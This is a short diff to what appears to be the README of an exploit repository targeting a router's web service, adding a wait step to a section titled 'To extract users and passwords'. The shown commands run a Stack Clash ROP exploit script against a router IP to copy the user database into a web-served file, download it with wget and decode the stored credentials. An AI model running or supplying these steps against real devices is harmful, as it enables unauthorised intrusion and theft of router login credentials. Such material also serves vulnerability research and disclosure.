@@ -31,6 +31,7 @@ Where:
 ### To extract users and passwords
 ```
 $ ./StackClashROPsystem.py 192.168.8.1 80 www_binary "cp /rw/store/user.dat /ram/winbox.idx"
+$ sleep 3 # (wait some seconds that www is restarted)
 $ wget http://192.168.8.1/winbox/index
 $ ./extract_user.py index
 ```
